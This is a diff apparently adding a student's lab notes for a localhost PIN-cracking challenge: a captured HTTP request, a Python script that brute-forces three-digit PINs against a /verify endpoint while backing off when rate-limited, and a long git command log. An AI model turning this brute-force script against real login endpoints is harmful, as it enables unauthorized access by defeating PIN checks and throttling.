@@ -1,0 +1,251 @@
+Wire shark
+	POST /verify HTTP/1.1
+	Host: 127.0.0.1:8888
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 15
+	Connection: close
+
+	magicNumber=059
+	HTTP/1.1 200 OK
+	Date: Sat, 26 Apr 2025 21:12:25 GMT
+	Content-Type: text/html; charset=utf-8
+	Connection: close
+	Transfer-Encoding: chunked
+
+
+Python Code:
+import socket
+import time
+
+Address = '127.0.0.1'
+Port = 8888
+
+sleep_time = 1.0 
+
+for pin in range(0, 1000):
+    formatted_pin = f"{pin:03d}"
+
+    try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((Address, Port))
+
+        body = f"magicNumber={formatted_pin}"
+        request = (
+            f"POST /verify HTTP/1.1\r\n"
+            f"Host: {Address}:{Port}\r\n"
+            "Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            "Connection: close\r\n"
+            "\r\n"
+            f"{body}"
+        )
+
+        client_socket.sendall(request.encode())
+        response = b""
+        while True:
+            part = client_socket.recv(4096)
+            if not part:
+                break
+            response += part
+
+        decoded_response = response.decode(errors="ignore")
+
+        if "congratulations" in decoded_response.lower() or "access granted" in decoded_response.lower() or "welcome" in decoded_response.lower():
+            print(f"[+] Found correct PIN: {formatted_pin}")
+            print(decoded_response) 
+            break
+        elif "slow down" in decoded_response.lower():
+            print(f"[!] Server said slow down after PIN {formatted_pin}. Increasing sleep time...")
+            sleep_time += 0.5
+        else:
+            print(f"[-] Tried PIN: {formatted_pin}")
+
+    except Exception as e:
+        print(f"[!] Error with PIN {formatted_pin}: {e}")
+
+    finally:
+        client_socket.close()
+
+    time.sleep(sleep_time)
+
+print("Brute force completed")
+
+
+
+CMD:
+
+Microsoft Windows [Version 10.0.22631.5189]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop>git clone https://github.com/fraaays/Pin_cracking.git
+Cloning into 'Pin_cracking'...
+warning: You appear to have cloned an empty repository.
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop>cd Pin_cracking
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>echo "#Pin cracking challenge" > README.md
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git add README.md
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git commit -m "First commit"
+[main (root-commit) 5bf1311] First commit
+ 1 file changed, 1 insertion(+)
+ create mode 100644 README.md
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git push origin main
+Enumerating objects: 3, done.
+Counting objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 246 bytes | 246.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+To https://github.com/fraaays/Pin_cracking.git
+ * [new branch]      main -> main
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>touch scripts.py
+'touch' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>echo. > scripts.py
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git add scripts.py
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git commit -m "First code"
+[main ca8f1ac] First code
+ 1 file changed, 13 insertions(+)
+ create mode 100644 scripts.py
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git push origin main
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 12 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 439 bytes | 439.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+To https://github.com/fraaays/Pin_cracking.git
+   5bf1311..ca8f1ac  main -> main
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git add scripts.py
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git commit -m "second commit"
+[main b20fe1f] second commit
+ 1 file changed, 4 insertions(+)
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git push origin main
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 12 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 391 bytes | 391.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: Resolving deltas: 100% (1/1), completed with 1 local object.
+To https://github.com/fraaays/Pin_cracking.git
+   ca8f1ac..b20fe1f  main -> main
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git add scripts.py
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git commit -m "Third commits"
+[main 5ab3a19] Third commits
+ 1 file changed, 14 insertions(+)
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git add scripts.py
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git commit -m "Fourth commits"
+[main c31b69e] Fourth commits
+ 1 file changed, 15 insertions(+)
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git push origin main
+Enumerating objects: 8, done.
+Counting objects: 100% (8/8), done.
+Delta compression using up to 12 threads
+Compressing objects: 100% (6/6), done.
+Writing objects: 100% (6/6), 1.06 KiB | 1.06 MiB/s, done.
+Total 6 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: Resolving deltas: 100% (1/1), done.
+To https://github.com/fraaays/Pin_cracking.git
+   b20fe1f..c31b69e  main -> main
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git  add scripts.py
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git commit -m "fifth commits"
+[main 3085c08] fifth commits
+ 1 file changed, 7 insertions(+), 1 deletion(-)
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git add scripts.py
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git commit -m "Fifth commits"
+On branch main
+Your branch is ahead of 'origin/main' by 1 commit.
+  (use "git push" to publish your local commits)
+
+Untracked files:
+  (use "git add <file>..." to include in what will be committed)
+        server/
+
+nothing added to commit but untracked files present (use "git add" to track)
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git push origin main
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 12 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 472 bytes | 472.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: Resolving deltas: 100% (1/1), completed with 1 local object.
+To https://github.com/fraaays/Pin_cracking.git
+   c31b69e..3085c08  main -> main
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git add scripts.py
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git commit -m "Complete Code"
+[main 519f332] Complete Code
+ 1 file changed, 47 insertions(+), 44 deletions(-)
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git push origin main
+To https://github.com/fraaays/Pin_cracking.git
+ ! [rejected]        main -> main (fetch first)
+error: failed to push some refs to 'https://github.com/fraaays/Pin_cracking.git'
+hint: Updates were rejected because the remote contains work that you do not
+hint: have locally. This is usually caused by another repository pushing to
+hint: the same ref. If you want to integrate the remote changes, use
+hint: 'git pull' before pushing again.
+hint: See the 'Note about fast-forwards' in 'git push --help' for details.
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git pull origin main
+remote: Enumerating objects: 5, done.
+remote: Counting objects: 100% (5/5), done.
+remote: Compressing objects: 100% (3/3), done.
+remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+Unpacking objects: 100% (3/3), 3.25 KiB | 832.00 KiB/s, done.
+From https://github.com/fraaays/Pin_cracking
+ * branch            main       -> FETCH_HEAD
+   3085c08..1696785  main       -> origin/main
+Merge made by the 'ort' strategy.
+ README.md | 157 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++-
+ 1 file changed, 156 insertions(+), 1 deletion(-)
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git push origin main
+Enumerating objects: 9, done.
+Counting objects: 100% (8/8), done.
+Delta compression using up to 12 threads
+Compressing objects: 100% (5/5), done.
+Writing objects: 100% (5/5), 986 bytes | 986.00 KiB/s, done.
+Total 5 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: Resolving deltas: 100% (1/1), completed with 1 local object.
+To https://github.com/fraaays/Pin_cracking.git
+   1696785..65eb0e5  main -> main
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git add scripts.py
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git commit -m "Final Complete Codes"
+[main 0eda7d8] Final Complete Codes
+ 1 file changed, 34 insertions(+), 8 deletions(-)
+
+C:\Users\Frilyn Alicos\OneDrive\Desktop\Pin_cracking>git push origin main
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 12 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 1011 bytes | 1011.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: Resolving deltas: 100% (1/1), completed with 1 local object.
+To https://github.com/fraaays/Pin_cracking.git
+   65eb0e5..0eda7d8  main -> main
